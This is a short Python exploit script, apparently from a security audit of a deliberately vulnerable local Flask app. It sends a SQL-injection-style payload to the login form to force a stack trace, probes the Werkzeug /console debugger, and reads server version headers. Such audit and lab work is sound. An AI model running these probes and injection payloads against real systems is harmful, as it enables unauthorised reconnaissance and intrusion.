# Exploit Debug Mode Enabled
# Auditor: DAVID H. CUEVAS SALGADO
# Vulnerabilidad: Information Disclosure
# Severidad: MEDIA (CVSS 5.0)

import requests

TARGET = 'http://localhost:5000'

print("="*60)
print("EXPLOIT: Debug Mode Enabled - Information Disclosure")
print("="*60)

# Test 1: Forzar error 500 para ver stack trace
print("\n[TEST 1] Provocar error para exponer stack trace")
print("-"*60)

# Payload que causa error
error_payload = {
    "username": "admin",
    "password": "test' AND 1=CAST('a' AS INTEGER)--"  # Causa error de tipo
}

response = requests.post(f'{TARGET}/login', data=error_payload)

if response.status_code == 500:
    print("[+] Error 500 provocado exitosamente")
    
    # Analizar contenido de la respuesta
    if 'Traceback' in response.text:
        print("[!] TRACEBACK COMPLETO EXPUESTO")
        print("[!] Información revelada:")
        
        if 'vulnerable_flask_app.py' in response.text:
            print("    ✓ Nombre de archivos de código fuente")
        if '/app/' in response.text:
            print("    ✓ Rutas absolutas del servidor")
        if 'line' in response.text:
            print("    ✓ Números de línea de código")
        if 'Werkzeug Debugger' in response.text:
            print("    ✓ Debugger interactivo accesible")

# Test 2: Acceder a recursos del debugger
print("\n[TEST 2] Acceder a recursos del Werkzeug Debugger")
print("-"*60)

debugger_urls = [
    '/console',
]

for url in debugger_urls:
    try:
        r = requests.get(f'{TARGET}{url}')
        if r.status_code != 404:
            print(f"[!] Accesible: {url} (Status: {r.status_code})")
    except:
        pass

# Test 3: Analizar headers de respuesta
print("\n[TEST 3] Analizar headers de respuesta")
print("-"*60)

headers = response.headers
if 'Server' in headers:
    print(f"[!] Server header expuesto: {headers['Server']}")
    if 'Werkzeug' in headers['Server']:
        print("    ✓ Versión de Werkzeug revelada")
    if 'Python' in headers['Server']:
        print("    ✓ Versión de Python revelada")

print("\n" + "="*60)
print("[!] VULNERABILIDAD CONFIRMADA: Debug Mode Enabled")
print("[!] IMPACTO: Exposición de código fuente y estructura interna")
print("="*60)
